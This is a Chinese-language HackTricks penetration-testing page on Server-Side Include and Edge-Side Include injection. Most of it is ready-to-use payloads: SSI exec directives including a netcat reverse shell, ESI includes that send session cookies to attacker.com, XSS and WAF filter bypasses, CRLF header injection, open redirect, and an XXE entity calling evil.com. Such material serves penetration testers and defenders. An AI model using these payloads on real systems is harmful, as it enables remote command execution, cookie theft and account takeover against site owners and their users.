# 服务器端包含/边缘端包含注入

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 服务器端包含基本信息

SSI（服务器端包含）是指令，它们**放置在HTML页面中，在服务器上进行评估**，同时页面正在提供服务。它们允许您**向现有的HTML页面添加动态生成的内容**，而无需通过CGI程序或其他动态技术提供整个页面。\
例如，您可以将指令放入现有的HTML页面中，如下所示：

`<!--#echo var="DATE_LOCAL" -->`

当页面提供服务时，此片段将被评估并替换为其值：

`星期二，2013年1月15日19:28:54 EST`

何时使用SSI以及何时完全由某个程序生成页面通常取决于页面的静态部分和每次提供页面时需要重新计算的部分。SSI是一种很好的方式来添加小块信息，例如上面显示的当前时间。但是，如果页面的大部分在提供服务时生成，您需要寻找其他解决方案。（定义来自[这里](https://httpd.apache.org/docs/current/howto/ssi.html)）。

您可以推断出SSI的存在，如果Web应用程序使用具有扩展名\*\* `.shtml`、`.shtm`或`.stm`\*\*的文件，但不仅限于此。

典型的SSI表达式具有以下格式：
```
<!--#directive param="value" -->
```
### 检查

To check for Server-Side Inclusion (SSI) and Edge-Side Inclusion (ESI) Injection vulnerabilities, you can follow these steps:

1. **Identify user-controllable input**: Look for any input fields or parameters where the user can provide data that is later included in the server-side or edge-side code.

2. **Test for inclusion**: Inject a simple payload, such as `<!--#echo var="DATE_LOCAL" -->` for SSI or `<esi:include src="http://attacker.com/malicious.xml" />` for ESI, into the user-controllable input and see if it is included in the response.

3. **Observe the response**: If the payload is included and executed, it indicates a potential SSI or ESI Injection vulnerability.

4. **Exploit the vulnerability**: Once you have confirmed the vulnerability, you can proceed to exploit it by injecting more complex payloads to achieve your desired outcome. This may include executing arbitrary commands, accessing sensitive information, or performing other malicious actions.

5. **Mitigate the vulnerability**: Finally, it is important to fix the vulnerability by implementing proper input validation and sanitization techniques. This can include filtering user input, using parameterized queries, and applying output encoding to prevent code injection attacks.

By following these steps, you can effectively identify and exploit Server-Side Inclusion and Edge-Side Inclusion Injection vulnerabilities, and take the necessary steps to mitigate them.
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## 边缘端包含

在缓存信息或动态应用程序中存在一个问题，因为内容的一部分可能在下次检索内容时发生变化。这就是ESI的用途，通过使用ESI标签来指示在发送缓存版本之前需要生成的动态内容。\
如果攻击者能够在缓存内容中注入ESI标签，那么他就可以在将文档发送给用户之前注入任意内容。

### ESI检测

以下来自服务器的响应中的**头部**表示服务器正在使用ESI：
```
Surrogate-Control: content="ESI/1.0"
```
如果您找不到此标题，则服务器**可能仍在使用ESI**。\
也可以使用**盲目利用方法**，因为请求应该到达攻击者的服务器：
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI利用

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)创建了一个表格，帮助我们了解可以针对不同支持ESI的软件尝试的可能攻击，具体取决于支持的功能。首先，让我们对下表中的列名进行一些解释：

* **Includes**: 支持`<esi:includes>`指令
* **Vars**: 支持`<esi:vars>`指令。用于绕过XSS过滤器
* **Cookie**: 文档cookie对ESI引擎可访问
* **Upstream Headers Required**: 除非上游应用程序提供头部，否则代理应用程序将不会处理ESI语句
* **Host Allowlist**: 在这种情况下，只有来自允许的服务器主机的ESI包含才可能，例如，只有针对这些主机才可能进行SSRF攻击

|         **软件**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      是     |    是   |     是     |              是              |         否         |
|         Varnish Cache        |      是     |    否    |      否     |              是              |         是        |
|            Fastly            |      是     |    否    |      否     |               否              |         是        |
| Akamai ESI Test Server (ETS) |      是     |    是   |     是     |               否              |         否         |
|          NodeJS esi          |      是     |    是   |     是     |               否              |         否         |
|         NodeJS nodesi        |      是     |    否    |      否     |               否              |      可选的      |

#### XSS

以下ESI指令将在服务器响应中加载任意文件
```markup
<esi:include src=http://attacker.com/xss.html>
```
文件_http://attacker.com/xss.html_可能包含一个XSS负载，如`<script>alert(1)</script>`

#### 绕过客户端XSS保护
```markup
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### 盗取 Cookie

* 远程盗取 Cookie
```markup
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* 通过在响应中反射XSS来窃取HTTP_ONLY的cookie：

```html
<script>
    var img = new Image();
    img.src = "http://attacker.com/steal.php?cookie=" + document.cookie;
</script>
```

这段代码将创建一个新的图像对象，并将cookie作为参数传递给攻击者的服务器。通过在受害者的浏览器中执行此代码，攻击者可以窃取HTTP_ONLY的cookie。
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
```
<figure><img src="../.gitbook/assets/image (4) (7).png" alt=""><figcaption></figcaption></figure>

* 通过反射cookie实现完全接管账户

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

#### 私有本地文件

不要将其与“本地文件包含”混淆：
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLF (Carriage Return Line Feed) 是一种特殊字符序列，用于表示文本文件中的换行。它由回车符（CR）和换行符（LF）组成。在某些情况下，CRLF 可以被利用来进行服务器端包含（SSI）和边缘端包含（ESI）注入攻击。

SSI 注入攻击是一种利用服务器端包含漏洞的攻击技术。攻击者可以通过在用户输入中插入特殊字符序列（如 CRLF）来注入恶意代码，从而执行任意命令或获取敏感信息。

ESI 注入攻击是一种利用边缘端包含漏洞的攻击技术。攻击者可以通过在用户输入中插入特殊字符序列（如 CRLF）来注入恶意代码，从而执行任意命令或获取敏感信息。

为了防止 CRLF 注入攻击，开发人员应该对用户输入进行严格的验证和过滤，确保不允许插入特殊字符序列。此外，服务器端应该配置安全的默认响应头，以防止恶意代码的执行。
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### 开放重定向

以下代码将在响应中添加一个 `Location` 头部。
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### 添加头部

* 在强制请求中添加头部
```html
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* 在响应中添加头部（用于绕过带有XSS的响应中的“Content-Type: text/json”）
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->
```
<figure><img src="../.gitbook/assets/image (5) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

#### 在添加头部时使用CRLF（**CVE-2019-2438)**
```markup
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai调试

这将发送包含在响应中的调试信息：
```markup
<esi:debug/>
```
### ESI + XSLT = XXE

还可以通过将`xslt`值指定给_dca_参数来添加基于\*\* **\_**可扩展样式表语言转换（XSLT）**\_** \*\*的ESI包含。以下包含将导致HTTP代理请求XML和XSLT文件。然后使用XSLT文件来过滤XML文件。可以使用此XML文件执行_XML外部实体（XXE）_攻击。这允许攻击者执行SSRF攻击，但这并不是非常有用，因为必须通过ESI包含来执行此操作，而ESI本身就是一个SSRF向量。由于底层库（Xalan）不支持外部DTD解析，因此无法提取本地文件。
```markup
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT文件：
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
查看XSLT页面：

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md](xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md)
{% endcontent-ref %}

### 参考资料

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## 暴力破解检测列表

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
